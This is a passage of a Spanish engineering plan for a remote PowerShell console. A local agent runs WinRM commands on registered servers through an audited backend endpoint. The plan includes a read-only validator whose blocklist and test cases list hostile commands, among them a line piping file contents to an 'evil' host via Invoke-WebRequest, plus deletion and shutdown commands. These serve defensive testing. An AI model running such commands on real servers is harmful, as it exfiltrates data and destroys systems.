# Plan 105 — Consola remota de prompts por servidor (auditada, reversible, 1-click switch)

**Estado:** CRITICADO (juez) — APROBADO-CON-CAMBIOS
**Versión:** v2
**Fecha:** 2026-07-08

> ### Changelog v1 → v2 (crítica adversarial + arquitecto proactivo)
> - **C1 (BLOQ, F3/F2):** `_launch_turn` (plan 90, `api/devops_agent.py:219-276`) NO acepta
>   override de `context_blocks`: hornea `id="devops-chat"` / `title="Mensaje del operador
>   (chat DevOps)"`. Era imposible obtener el `id="remote-console"` que prometía F3 sin
>   tocar código del plan 90. Reconciliado: se REUSA `_launch_turn` **verbatim**; el
>   contrato de consola viaja DENTRO de `message` (envuelto por `build_console_prompt`).
>   Se eliminó la afirmación falsa `id="remote-console"`/`source` de F3.
> - **C2 (BLOQ, F3):** firma de `build_console_prompt` contradictoria en el doc (definida sin
>   `conversation_id`, llamada sin él en F2, pero el template interpola `{{CONVERSATION_ID}}`).
>   Firma unificada: `build_console_prompt(server_alias, base_url, message, conversation_id,
>   *, write_enabled)`; todos los call sites de F2 la pasan.
> - **C3 (IMPORTANTE, F1 seguridad):** el validador read-only tenía bypass real vía bloques
>   `{ }` no inspeccionados (`... | %{ & $_ }`, `... | ForEach-Object { Invoke-WebRequest }`).
>   Endurecido: blocklist de `&`/`.Invoke`/`$(`/backtick/`[scriptblock]`/`iwr`/`irm`/
>   `Invoke-WebRequest`/`Invoke-RestMethod`/`Start-Process`/`Add-Type`, y RECHAZO de todo
>   comando con `{`…`}` en modo read_only. + tests nuevos.
> - **C4 (IMPORTANTE, F4 UX — directiva del operador):** `window.confirm` (diálogo nativo
>   feo) reemplazado por confirmación in-panel profesional; ver `[ADICIÓN ARQUITECTO]` UX.
> - **C5 (MENOR, F1/F2):** faltaban tests para `check_winrm` y para exec manual sin
>   `conversation_id` (debe ser read_only). Agregados.
> - **[ADICIÓN ARQUITECTO] (F4):** paquete de UX de consola profesional y novedosa
>   (badge de modo persistente, auditoría tejida en el stream como command-cards, header de
>   servidor activo con chip WinRM, chips de diagnóstico 1-click, atajos de teclado). Todo
>   opt-in/sin config nueva, HITL respetado.
>
> **Veredicto del juez:** APROBADO-CON-CAMBIOS. Sin bloqueantes remanentes tras C1-C2; base
> sólida (reuso real de 90/91, flag OFF byte-idéntico, auditoría estructural). Los C1/C2 eran
> bloqueantes de *implementabilidad por modelo menor* (contradicciones internas) y quedan
> resueltos en este v2.
**Serie DevOps:** extensión del panel (plan 87 §3.12); consume el registro de servidores del plan 91 y el patrón de conversaciones del plan 90.
**Dependencias duras:** plan 91 (IMPLEMENTADO — `services/server_registry.py`, `api/devops_servers.py`), plan 90 (IMPLEMENTADO — `api/devops_agent.py`, `_launch_turn`), plan 87 (shell `DevOpsPage.tsx` + `FlagGateBanner`).
**Relación con plan 101:** complementario, NO solapado. El 101 (PROPUESTO) bootstrapea carpetas vía UNC + `net use`. Este plan ejecuta PROMPTS de agente y comandos PowerShell vía WinRM con auditoría. Ninguno depende del otro.

> Este documento está redactado para que un MODELO MENOR (Haiku, Codex CLI o GitHub
> Copilot Pro) lo implemente SIN inferir nada. Toda afirmación sobre código existente
> cita `archivo:línea` verificada el 2026-07-08 sobre el working tree
> (rama `codex/subida-cambios-pendientes`). Prohibido desviarse de los nombres exactos.

---

## 1. Objetivo + KPI

**Objetivo (pedido textual del operador):** "disponer de alguna parte donde yo, en base a
un servidor configurado, pueda ejecutar prompts […] ejecutar un agente desde Stacky en mi
computadora pero que entre al servidor al que le doy acceso y pueda ejecutar scripts
PowerShell. Premisas: MUY SIMPLE, REVERSIBLE, AUDITABLE, y moverme de servidor en servidor
fácilmente: con 1 click cambio de servidor y tengo los prompts anteriores y toda la
trazabilidad bien separada por servidor."

Se agrega una sección **"Consola remota"** al panel DevOps: el operador elige un servidor
del registro existente (plan 91), escribe un prompt, y un agente (runtime CLI local)
resuelve el pedido ejecutando comandos PowerShell EN el servidor remoto **a través de un
único endpoint local del backend** que: (a) posee la credencial (keyring, nunca el agente),
(b) valida modo lectura/escritura, y (c) **audita el 100% de los comandos** en un JSONL por
servidor. Las conversaciones quedan etiquetadas por servidor: cambiar de servidor en el
selector existente re-filtra historial y auditoría en 1 click.

**KPIs (binarios):**
- **KPI-1 (simple):** ejecutar un prompt contra un servidor = seleccionar servidor (1 click,
  selector del plan 91) + escribir prompt + Enter. Cero configuración nueva por prompt.
- **KPI-2 (auditable):** el 100% de los comandos remotos pasa por `run_remote()` y queda en
  `devops_remote_audit/<alias>.jsonl` (timestamp, comando, modo, exit code, hash del output,
  conversation_id). No existe otro camino de ejecución remota en el código de este plan
  (test centinela `test_f1_no_remote_exec_bypass`).
- **KPI-3 (reversible):** nada se instala en el servidor (WinRM es built-in de Windows
  Server); modo default `read_only` (el validador rechaza todo verbo mutante); con la flag
  OFF (default) el sistema es byte-idéntico a hoy (endpoints 404, sección con
  `FlagGateBanner`).
- **KPI-4 (trazabilidad por servidor):** conversaciones y auditoría se filtran por
  `server_alias`; cambiar servidor NO mezcla historiales (test
  `test_f2_conversations_filtered_by_alias`).
- **KPI-5 (secretos):** el password JAMÁS aparece en el prompt del agente, en argumentos de
  línea de comandos, en el JSONL de auditoría, en logs ni en respuestas HTTP (test centinela
  `test_f1_password_never_in_audit_nor_args`).

---

## 2. Por qué ahora / gap

- El plan 91 dejó listo el registro de servidores con credenciales en keyring y el contrato
  `get_credential(alias) -> (username_completo, password, host)`
  (`services/server_registry.py:205-218`) **explícitamente para que "la extensión remota lo
  consuma"** (`91_PLAN_REGISTRO_SERVIDORES_DEVOPS_CONEXIONES_ALIAS.md:83-84`). Hoy el único
  consumidor de la credencial es RDP 1-click. Este plan es esa extensión remota.
- El plan 90 dejó el patrón completo de conversaciones multi-turno con agente CLI
  (`api/devops_agent.py:219-283`, `_launch_turn` con `context_blocks` +
  `agent_runner.run_agent`). Este plan lo REUSA, no lo duplica.
- El plan 89 dejó fuera de scope la operación remota
  (`89_PLAN_INICIALIZACION_AMBIENTES_DEVOPS.md:958-960`); el plan 101 (PROPUESTO) cubre solo
  bootstrap de carpetas por UNC. **Nadie cubre "prompt → agente → PowerShell en el
  servidor"**: hoy el operador se conecta por RDP y diagnostica a mano (ej.: "revisá la
  carpeta de los procesos y decime por qué fallan").
- El shell del panel (plan 87 §3.12) hace que agregar la sección sea declarativo:
  1 entrada en `DEVOPS_SECTIONS` (`frontend/src/pages/DevOpsPage.tsx:82-121` muestra el
  patrón healthKey/gateFlagKey) + 1 componente + 1 blueprint.

---

## 3. Principios y guardarraíles (codificados, no negociables)

- **§3.1 Credencial solo en backend.** El agente NUNCA ve el password: ejecuta comandos
  remotos llamando por HTTP local al endpoint `/api/devops/console/exec`; el backend
  resuelve la credencial vía `server_registry.get_credential(alias)` en memoria y la pasa al
  proceso hijo `powershell.exe` **solo por variables de entorno del hijo** (jamás por
  argumentos de línea de comandos, jamás a disco, jamás al prompt). Si keyring no está
  disponible → 503 explícito (mismo riel §3.1 del plan 91). Nota: `build_agent_env` ya
  filtra tokens del entorno del agente; aquí además el secreto nunca entra a ese entorno.
- **§3.2 Human-in-the-loop innegociable.** Cada turno del agente lo dispara el operador
  escribiendo un prompt. No hay scheduling, ni polling remoto, ni auto-reintentos. El modo
  escritura se habilita POR CONVERSACIÓN con un toggle explícito del operador (default
  lectura). Nada muta un servidor sin ese click previo.
- **§3.3 Auditoría estructural, no opcional.** `run_remote()` es la ÚNICA función que toca
  WinRM y SIEMPRE escribe el registro de auditoría antes de devolver (incluso en error).
  La auditoría es un JSONL append-only por alias, local, legible y borrable por el operador
  (reversible).
- **§3.4 Modo lectura por default.** `is_read_only_command()` es un validador determinista
  conservador (allowlist de verbos + blocklist de tokens mutantes). Ante la duda, RECHAZA.
  El modo escritura no valida verbos pero sigue auditando todo.
- **§3.5 Opt-in, default OFF, activable por UI.** Flag `STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED`
  (`env_only=False`, riel operator-config-always-via-ui). Flag OFF ⇒ 404 en todos los
  endpoints nuevos + `FlagGateBanner` en la sección. Cero pasos manuales nuevos.
- **§3.6 Paridad de 3 runtimes con degradación explícita.** El primitivo remoto es un
  endpoint HTTP local: cualquier runtime que pueda ejecutar `curl.exe` lo usa idéntico
  (Claude Code CLI y Codex CLI lo hacen). Las CONVERSACIONES de consola reusan la
  restricción ya sancionada del plan 90: runtimes CLI (`api/devops_agent.py:12`
  `_CLI_RUNTIMES = ("claude_code_cli", "codex_cli")`); para GitHub Copilot la UI muestra el
  mismo aviso que el chat DevOps (flujo interactivo de VS Code) Y ADEMÁS la consola ofrece
  **modo manual sin agente** (el operador escribe el comando y la UI llama a `/exec`
  directamente), que funciona con cualquier runtime e incluso sin ninguno.
- **§3.7 Mono-operador sin auth.** Sin RBAC, sin permisos por servidor. El riel de seguridad
  es §3.1 + §3.4 + guard `request.is_json` en POSTs (patrón C5 del plan 91,
  `api/devops_servers.py:19-25` `_guard`).
- **§3.8 Windows/WinRM only, degradación honesta.** `run_remote` en `sys.platform != "win32"`
  devuelve error `remote_exec_windows_only` (el endpoint responde 501). El endpoint
  `GET /winrm/<alias>` permite chequear disponibilidad ANTES de conversar; la UI muestra el
  semáforo. Si WinRM no está habilitado en el destino, el error de `Invoke-Command` se
  devuelve VERBATIM (sin password — ver F1) con hint accionable
  (`Enable-PSRemoting -Force` corre EN el servidor, decisión del operador; NO la ejecuta
  Stacky).
- **§3.9 No degradar.** Ningún archivo existente cambia su comportamiento con la flag OFF.
  Los cambios a archivos compartidos (`config.py`, `harness_flags.py`,
  `harness_flags_help.py`, `devops.py::_health_payload`, `DevOpsPage.tsx`) son aditivos.
- **§3.10 Working tree ajeno.** Hay WIP del plan 98 sin commitear (`api/client_profile.py`,
  `api/devops.py`, etc.). PROHIBIDO `git add -A`: se agregan SOLO los archivos de este plan
  por ruta explícita. Si un archivo compartido ya tiene hunks ajenos, commitear SOLO los
  hunks propios (`git add -p`) o coordinar con el operador.

---

## 4. Diseño de una pasada (para entender antes de las fases)

```
Operador (UI RemoteConsoleSection, servidor "PROD-BATCH" seleccionado)
   │ prompt: "revisá D:\Procesos\logs y decime por qué falla RsExtrae"
   ▼
POST /api/devops/console/conversations {server_alias, project, message, runtime}
   │  crea Ticket(ado_id=-4, description=JSON{kind, server_alias, write_enabled:false})
   │  lanza turno vía agent_runner.run_agent (patrón plan 90) con context block que
   │  enseña el contrato curl del endpoint /exec (SIN credenciales)
   ▼
Agente CLI local (Claude Code / Codex) — corre en la máquina del operador
   │ curl.exe -s -X POST http://127.0.0.1:PUERTO/api/devops/console/exec
   │      -H "Content-Type: application/json"
   │      -d '{"alias":"PROD-BATCH","command":"Get-ChildItem D:\\Procesos\\logs | ...","conversation_id":123}'
   ▼
Backend services/remote_exec.py::run_remote()
   │ 1. valida flag + alias + modo (read_only salvo write_enabled de la conversación)
   │ 2. get_credential(alias) → (user, pass, host)   [keyring, en memoria]
   │ 3. powershell.exe -NoProfile -NonInteractive -File exec_remote.ps1  (script FIJO
   │    del repo; comando/host/user/pass viajan por ENV del hijo, no por argv)
   │    → Invoke-Command -ComputerName $env:SR_HOST -Credential $cred -ScriptBlock ...
   │ 4. append_audit(alias, {...})  SIEMPRE (éxito o error)
   ▼
respuesta JSON {ok, stdout, stderr, exit_code, duration_ms} → el agente la interpreta
   y responde al operador en la conversación.
```

Cambio de servidor = click en el selector existente del shell (plan 91 F6,
`DevOpsPage.tsx`): la sección re-consulta `GET /conversations?server=<alias>` y
`GET /audit/<alias>`. Historiales separados por diseño (el alias vive en la conversación).

---

## 5. Fases

### F0 — Flag + health + bootstrap (fundación)

**Objetivo:** flag `STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED` visible/activable en UI, expuesta
en health del panel, con requires correcto; todo OFF por default.

**Archivos a editar (todos aditivos):**

1. `Stacky Agents/backend/config.py` — junto al bloque de flags DevOps
   (`config.py:861-933`), agregar con el MISMO patrón del archivo (sin `.strip()`, gotcha
   C9 plan 91):
   ```python
   # Plan 105 — Consola remota de prompts por servidor (default OFF).
   STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED: bool = os.getenv(
       "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", "false"
   ).lower() in ("true", "1", "yes")
   ```
   (Copiar el sufijo de parseo EXACTO de la flag vecina `STACKY_DEVOPS_SECTION_DOCTOR_ENABLED`,
   `config.py:930-933` — gana el patrón del archivo.)

2. `Stacky Agents/backend/services/harness_flags.py`:
   - agregar `"STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED",  # Plan 105 — consola remota` a la
     lista de categoría devops (vecinas en `harness_flags.py:182-188`);
   - agregar el `FlagSpec` junto a los de la serie (vecino
     `STACKY_DEVOPS_SECTION_DOCTOR_ENABLED` en `harness_flags.py:2142`):
     `key="STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED"`, `env_only=False`,
     `requires="STACKY_DEVOPS_PANEL_ENABLED"`, **SIN parámetro `default`** (gotcha lista
     curada Plan 63: solo flags en `_CURATED_DEFAULTS_ON` declaran default). Copiar los
     demás kwargs (label/category/description) del vecino adaptando textos.
   - **Gotcha R4 profundidad-1:** `requires` DEBE apuntar a la flag master
     `STACKY_DEVOPS_PANEL_ENABLED` (NO a `STACKY_DEVOPS_SERVERS_ENABLED`, que ya es hija) —
     mismo criterio que el plan 104. La dependencia real de servidores se valida en runtime
     (F2, error 409 `remote_console_requires_servers`).

3. `Stacky Agents/backend/tests/test_harness_flags_requires.py` — agregar la arista al mapa
   congelado `_REQUIRES_MAP_FROZEN` (línea 120):
   ```python
   "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED": "STACKY_DEVOPS_PANEL_ENABLED",  # Plan 105
   ```

4. `Stacky Agents/backend/services/harness_flags_help.py` — `PlainHelp` nuevo (vecino
   `STACKY_DEVOPS_SECTION_DOCTOR_ENABLED`, línea 662) con texto llano:
   "Habilita la Consola remota: chateás con un agente que ejecuta comandos PowerShell en el
   servidor seleccionado, con auditoría completa por servidor. Requiere el panel DevOps y
   al menos un servidor registrado."

5. `Stacky Agents/backend/api/devops.py::_health_payload` (líneas 26-58) — agregar:
   ```python
   "remote_console_enabled": bool(getattr(cfg, "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", False)),  # Plan 105
   ```
   NOTA §3.10: `api/devops.py` tiene WIP ajeno en el working tree → commit por hunks.

**Tests PRIMERO** — `Stacky Agents/backend/tests/test_plan105_remote_console_flag.py`:
- `test_f0_flag_default_off` — `config.config.STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED is False`
  con entorno limpio (monkeypatch `os.environ` sin la key + reload del patrón que usen los
  tests vecinos de flags de la serie, p.ej. `tests/test_plan104_*`).
- `test_f0_flag_registered_in_registry` — la key existe en el registry de
  `harness_flags` con `env_only=False` y `requires == "STACKY_DEVOPS_PANEL_ENABLED"`.
- `test_f0_flag_has_plain_help` — la key existe en el dict de `harness_flags_help`.
- `test_f0_health_exposes_remote_console` — `GET /api/devops/health` (test client Flask,
  patrón de `test_plan91_*`) incluye `remote_console_enabled` como bool.

**Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_remote_console_flag.py -q`
**También correr (no-regresión):** `venv/Scripts/python.exe -m pytest tests/test_harness_flags_requires.py tests/test_harness_flags.py -q`

**Criterio binario:** los 4 tests nuevos + los 2 archivos de no-regresión en verde.
**Flag:** `STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED` default OFF.
**Runtimes:** N/A (config pura). **Trabajo del operador:** ninguno.

---

### F1 — Servicio `remote_exec` (validador read-only + WinRM + auditoría)

**Objetivo:** único punto de ejecución remota, seguro y 100% auditado.

**Archivo NUEVO:** `Stacky Agents/backend/services/remote_exec.py`

```python
"""services/remote_exec.py — Plan 105. ÚNICO módulo que ejecuta comandos remotos.

Riel §3.1: la credencial viaja SOLO por env del proceso hijo powershell.exe.
Riel §3.3: run_remote SIEMPRE audita (éxito o error) antes de devolver.
"""
from __future__ import annotations

import hashlib
import json
import re
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

_AUDIT_LOCK = threading.Lock()
_TIMEOUT_S_DEFAULT = 120
_TIMEOUT_S_MAX = 600
_OUTPUT_CAP = 200_000  # chars; truncar stdout/stderr más allá (marca "...[truncated]")

# §3.4 — validador conservador. Allowlist de PRIMER token (verbo/alias de lectura):
_READ_VERBS = re.compile(
    r"^\s*(Get-|Test-|Select-|Measure-|Resolve-|Compare-|Find-|Show-|Trace-)[A-Za-z]+"
    r"|^\s*(dir|ls|type|cat|gci|gc|echo|hostname|whoami|tasklist)\b",
    re.IGNORECASE,
)
# Blocklist de tokens mutantes/peligrosos en CUALQUIER parte del comando.
# C3 (v2): sumados vectores de EJECUCIÓN ARBITRARIA y descarga/exfil que un agente
# podría intentar creyéndolos "de lectura" (el riesgo real es el AGENTE, no un humano
# adversario — mono-operador). El operador de veras destructivo usa el modo escritura.
_MUTANT_TOKENS = re.compile(
    r"(Remove-|Set-|New-|Stop-|Start-|Restart-|Clear-|Move-|Rename-|Copy-|Add-|Install-|"
    r"Uninstall-|Disable-|Enable-|Invoke-Expression|iex\b|Invoke-Command|Invoke-WebRequest|"
    r"Invoke-RestMethod|\biwr\b|\birm\b|\bcurl\b|\bwget\b|Start-Process|Add-Type|"
    r"\.Invoke\b|\[scriptblock\]|Out-File|Set-Content|"
    r"Add-Content|Format-Volume|Stop-Computer|Restart-Computer|del\b|rd\b|rmdir\b|"
    r"erase\b|mklink\b|reg\s+(add|delete)|schtasks|sc\s+(config|delete|stop|start)|"
    r"&|\$\(|`|>>|(?<![0-9a-zA-Z])>(?![0-9a-zA-Z=]))",
    re.IGNORECASE,
)

def is_read_only_command(command: str) -> bool:
    """True solo si el comando ARRANCA con verbo de lectura y NO contiene tokens
    mutantes. Cada segmento de pipeline (split por '|') y cada statement (split por
    ';') debe cumplir la allowlist o ser un cmdlet de formato/filtro inocuo."""
    if not command or not command.strip():
        return False
    # C3 (v2): en read_only NUNCA se permiten bloques de script { ... }: son el vector
    # clásico de ejecución arbitraria dentro de un pipeline "de lectura"
    # (p.ej. `Get-Content x | %{ & $_ }`). Ante llaves → RECHAZA.
    if "{" in command or "}" in command:
        return False
    if _MUTANT_TOKENS.search(command):
        return False
    _INNOCUOUS = re.compile(
        r"^\s*(Where-Object|ForEach-Object|Sort-Object|Select-Object|Select-String|"
        r"Format-Table|Format-List|Out-String|ConvertTo-Json|Group-Object|"
        r"Measure-Object|\?|%|ft|fl|sort|select)\b",
        re.IGNORECASE,
    )
    for stmt in command.split(";"):
        if not stmt.strip():
            continue
        segments = stmt.split("|")
        if not _READ_VERBS.search(segments[0]):
            return False
        for seg in segments[1:]:
            if not (_READ_VERBS.search(seg) or _INNOCUOUS.search(seg)):
                return False
    return True

def _audit_dir() -> Path:
    from runtime_paths import data_dir
    p = Path(data_dir()) / "devops_remote_audit"
    p.mkdir(parents=True, exist_ok=True)
    return p

def append_audit(alias: str, entry: dict) -> None:
    """Append-only JSONL por alias. entry NO debe contener secretos (el caller
    garantiza; este módulo además hace un assert defensivo)."""
    from services.server_registry import validate_alias
    if not validate_alias(alias):
        raise ValueError(f"alias inválido: {alias!r}")
    entry = dict(entry)
    entry["ts"] = datetime.now(timezone.utc).isoformat()
    line = json.dumps(entry, ensure_ascii=False)
    with _AUDIT_LOCK:
        with open(_audit_dir() / f"{alias}.jsonl", "a", encoding="utf-8") as fh:
            fh.write(line + "\n")

def read_audit(alias: str, limit: int = 100, offset: int = 0) -> list[dict]:
    """Lee el JSONL del alias, MÁS RECIENTES PRIMERO. Tolerante a líneas corruptas
    (las salta). Devuelve [] si el archivo no existe."""
    from services.server_registry import validate_alias
    if not validate_alias(alias):
        raise ValueError(f"alias inválido: {alias!r}")
    path = _audit_dir() / f"{alias}.jsonl"
    if not path.exists():
        return []
    rows = []
    for raw in path.read_text(encoding="utf-8").splitlines():
        try:
            rows.append(json.loads(raw))
        except Exception:
            continue
    rows.reverse()
    return rows[offset : offset + limit]

def check_winrm(alias: str) -> dict:
    """Test-WSMan contra el host del alias. Devuelve {"ok": bool, "detail": str}.
    NO usa credencial (Test-WSMan sin -Credential valida el listener)."""
    # win32-only; en otros SO {"ok": False, "detail": "windows_only"}
    ...

def run_remote(
    alias: str,
    command: str,
    *,
    mode: str,                 # "read_only" | "write"
    conversation_id: int | None = None,
    user: str = "",
    timeout_s: int = _TIMEOUT_S_DEFAULT,
) -> dict:
    """Ejecuta `command` en el servidor `alias` vía Invoke-Command (WinRM).

    Retorna SIEMPRE un dict: {"ok": bool, "error": str|None, "stdout": str,
    "stderr": str, "exit_code": int|None, "duration_ms": int}.
    Errores tipificados en "error": remote_exec_disabled | server_not_found |
    keyring_unavailable | no_password | command_not_read_only |
    remote_exec_windows_only | winrm_error | timeout.
    SIEMPRE llama a append_audit() antes de retornar (riel §3.3), con:
      {kind:"exec", command, mode, ok, error, exit_code, duration_ms,
       stdout_sha256, stdout_bytes, conversation_id, user}
    — NUNCA el stdout completo ni la credencial en la auditoría.
    """
    # 1) guards: flag ON, sys.platform == "win32", mode válido,
    #    timeout_s = min(max(timeout_s, 1), _TIMEOUT_S_MAX)
    # 2) if mode == "read_only" and not is_read_only_command(command): error
    #    command_not_read_only (SE AUDITA el rechazo con ok=False)
    # 3) from services.server_registry import get_server, get_credential,
    #    keyring_available; resolver server y credencial (errores tipificados)
    # 4) subprocess.run(
    #        ["powershell.exe", "-NoProfile", "-NonInteractive",
    #         "-ExecutionPolicy", "Bypass", "-File", str(_EXEC_PS1)],
    #        env={**os.environ, "SR_HOST": host, "SR_USER": username,
    #             "SR_PASS": password, "SR_CMD": command,
    #             "SR_TIMEOUT": str(timeout_s)},
    #        capture_output=True, text=True, timeout=timeout_s + 15)
    #    _EXEC_PS1 = Path(__file__).parent / "remote_exec_invoke.ps1" (script FIJO
    #    del repo — NUNCA se genera un .ps1 temporal con datos).
    # 5) except TimeoutExpired / OSError → error genérico SIN repr del comando del
    #    subproceso (patrón C1 plan 91: el mensaje de la excepción puede citar argv;
    #    aquí argv no contiene secretos, pero igual se responde mensaje fijo).
    # 6) truncar stdout/stderr a _OUTPUT_CAP; auditar; retornar.
    ...
```

**Archivo NUEVO:** `Stacky Agents/backend/services/remote_exec_invoke.ps1` (estático,
versionado, SIN datos — lee todo de env):
```powershell
# Plan 105 — invocador WinRM. Credencial SOLO por env del proceso (nunca argv/disk).
$ErrorActionPreference = 'Stop'
try {
    $sec  = ConvertTo-SecureString $env:SR_PASS -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($env:SR_USER, $sec)
    $sb   = [scriptblock]::Create($env:SR_CMD)
    $out  = Invoke-Command -ComputerName $env:SR_HOST -Credential $cred -ScriptBlock $sb |
            Out-String -Width 500
    Write-Output $out
    exit 0
} catch {
    # El mensaje puede contener host/usuario pero NUNCA el password (no se interpola).
    Write-Error ($_.Exception.Message)
    exit 1
}
```
`check_winrm` usa el mismo patrón con `Test-WSMan -ComputerName $env:SR_HOST` (script
inline con `-Command` es aceptable porque NO lleva credencial; el host se valida antes con
`server_registry.validate_host`, `server_registry.py:51`).

**Tests PRIMERO** — `Stacky Agents/backend/tests/test_plan105_remote_exec_service.py`
(subprocess SIEMPRE mockeado con `unittest.mock.patch("services.remote_exec.subprocess.run")`;
keyring/fs mockeados igual que en `test_plan91_*`; `_audit_dir` redirigido a `tmp_path` con
monkeypatch):
- `test_f1_read_only_accepts_get_pipeline` — `Get-ChildItem D:\x | Sort-Object Name | Select-Object -First 5` → True.
- `test_f1_read_only_accepts_aliases` — `dir C:\`, `type foo.log`, `Get-Content x -Tail 50` → True.
- `test_f1_read_only_rejects_mutants` — cada uno → False: `Remove-Item x`,
  `Get-Item x; Remove-Item x`, `Get-Content x | Out-File y`, `Get-Process > p.txt`,
  `Invoke-Expression $c`, `iex $c`, `Restart-Computer`, `schtasks /delete /tn x`, `""`.
- `test_f1_read_only_rejects_scriptblock_vectors` (C3 v2) — cada uno → False:
  `Get-Content x | %{ & $_ }`, `Get-ChildItem | ForEach-Object { $_.Delete() }`,
  `Get-Content x | %{ Invoke-WebRequest http://evil/$_ }`, `Get-Item x | %{ iex $_ }`,
  `Get-Process | Where-Object { Stop-Process $_ }`, `& (Get-Command Remove-Item)`,
  `Get-Content x | iwr`, `Get-Foo; Start-Process calc`, `Get-Content x | Add-Type -Path $_`.
  (Cubre: rechazo de llaves `{`/`}` + blocklist enriquecida `&`/`.Invoke`/`iwr`/`irm`/
  `Invoke-WebRequest`/`Start-Process`/`Add-Type`/`$(`/backtick.)
- `test_f1_read_only_rejects_unknown_first_verb` — `Invoke-WebRequest http://x` → False.
- `test_f1_run_remote_read_only_blocks_and_audits` — mode read_only + comando mutante ⇒
  `ok=False, error="command_not_read_only"`, subprocess NO llamado, y el JSONL del alias
  tiene 1 entrada con `ok: false`.
- `test_f1_run_remote_success_audits_hash` — subprocess mock exit 0/stdout "hola" ⇒
  respuesta ok con stdout "hola"; la entrada de auditoría tiene `stdout_sha256 ==
  hashlib.sha256(b"hola").hexdigest()` y NO contiene la clave `stdout`.
- `test_f1_password_never_in_audit_nor_args` (KPI-5) — con password "S3cr3t!":
  `subprocess.run` recibió el password SOLO en `kwargs["env"]["SR_PASS"]`; ningún elemento
  de `args[0]` lo contiene; el JSONL serializado no contiene "S3cr3t!".
- `test_f1_run_remote_flag_off` — flag OFF ⇒ `error="remote_exec_disabled"` sin subprocess.
- `test_f1_run_remote_non_windows` — monkeypatch `sys.platform`→"linux" ⇒
  `error="remote_exec_windows_only"` (auditado).
- `test_f1_timeout_generic_error` — mock lanza `TimeoutExpired` ⇒ `error="timeout"`,
  mensaje fijo sin repr del argv (patrón C1 plan 91).
- `test_f1_audit_read_most_recent_first` — 3 appends ⇒ `read_audit` los devuelve invertidos;
  línea corrupta intercalada se salta.
- `test_f1_check_winrm_non_windows` (C5 v2) — monkeypatch `sys.platform`→"linux" ⇒
  `check_winrm(alias)` devuelve `{"ok": False, "detail": "windows_only"}` sin subprocess.
- `test_f1_no_remote_exec_bypass` (KPI-2, centinela) — grep del árbol backend:
  `Invoke-Command -ComputerName` aparece SOLO en `services/remote_exec_invoke.ps1`, y
  `subprocess` NO se usa en `api/devops_remote_console.py` (leer el fuente con
  `Path(...).read_text()` y assert).

**Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_remote_exec_service.py -q`
**Criterio binario:** 14 tests en verde. **Flag:** consumida vía guard (1).
**Runtimes:** N/A (servicio backend). **Trabajo del operador:** ninguno.

---

### F2 — Blueprint `api/devops_remote_console.py` (exec + auditoría + conversaciones por servidor)

**Objetivo:** API completa de la consola: ejecutar, auditar, conversar, todo scoped por alias.

**Archivo NUEVO:** `Stacky Agents/backend/api/devops_remote_console.py`

```python
"""api/devops_remote_console.py — Plan 105. url_prefix="/devops/console"
→ rutas /api/devops/console/... (NO poner /api/ en el prefix; gotcha C2 plan 73)."""
from flask import Blueprint, jsonify, request

import config as _config

bp = Blueprint("devops_remote_console", __name__, url_prefix="/devops/console")

_CONSOLE_ADO_ID = -4  # discriminador (plan 90 usa -2, plan 104 usa -3)

def _flag_off() -> bool:
    return not getattr(_config.config, "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", False)

def _servers_off() -> bool:
    return not getattr(_config.config, "STACKY_DEVOPS_SERVERS_ENABLED", False)

def _guard():
    # patrón plan 91 (api/devops_servers.py:19-25): 404 flag off; 400 POST sin JSON
    ...

def _conv_meta(ticket) -> dict:
    """description es JSON {"kind":"remote_console","server_alias":str,
    "write_enabled":bool}. Tolerante: description no-JSON ⇒ {}."""
    ...
```

**Rutas (todas con `_guard()`; los POST además `request.is_json` → 400):**

1. `POST /exec` — body `{alias, command, conversation_id?, timeout_s?}`.
   - Si `_servers_off()` → 409 `{"error":"remote_console_requires_servers"}` (dependencia
     runtime de F0).
   - Modo: `read_only` SALVO que `conversation_id` refiera a un Ticket `ado_id=-4` cuyo
     `_conv_meta(...)["write_enabled"] is True` **y** cuyo `server_alias == alias`
     (anti-confusión: una conversación con escritura en un server no habilita otro).
   - Llama `remote_exec.run_remote(alias, command, mode=..., conversation_id=...,
     user=current_user())` (import canónico `from api._helpers import current_user`,
     patrón C2 plan 90).
   - Mapeo HTTP: `ok=True` → 200; `error=="command_not_read_only"` → 403;
     `"server_not_found"` → 404; `"keyring_unavailable"`/`"no_password"` → 503;
     `"remote_exec_windows_only"` → 501; `"timeout"` → 504; resto → 502. SIEMPRE con el
     dict completo de `run_remote` en el body.
2. `GET /audit/<alias>?limit=&offset=` — `read_audit`; alias inválido → 400; límite
   máximo 500.
3. `GET /winrm/<alias>` — `check_winrm`; 200 `{"ok":bool,"detail":str}`.
4. `POST /conversations` — body `{server_alias, project, message, runtime?, model?, effort?}`.
   - Valida server existente (`server_registry.get_server`), si no → 404.
   - Crea `Ticket(ado_id=_CONSOLE_ADO_ID, project=project, stacky_project_name=project,
     title=f"[Stacky] Consola {server_alias} — {message[:50]}", work_item_type="Task",
     ado_state="Active", description=json.dumps({"kind":"remote_console",
     "server_alias":server_alias, "write_enabled":False}))`.
   - **OBLIGATORIO** sellar `ticket.external_id = -ticket.id` tras `session.flush()`
     (gotcha backfill `db.py:158-196`, documentado en `api/devops_agent.py:60-77`).
   - Lanza el turno reusando `from api.devops_agent import _launch_turn` **VERBATIM**
     (NO se modifica el plan 90). C1 (v2): `_launch_turn` hornea su propio
     `context_blocks` con `id="devops-chat"` (`api/devops_agent.py:231-237`) y NO acepta
     override — por eso el contrato de consola NO viaja en un block aparte sino DENTRO de
     `message`: se pasa `message = build_console_prompt(server_alias, base_url, message,
     conversation_id, write_enabled=<estado de la conversación>)`, con
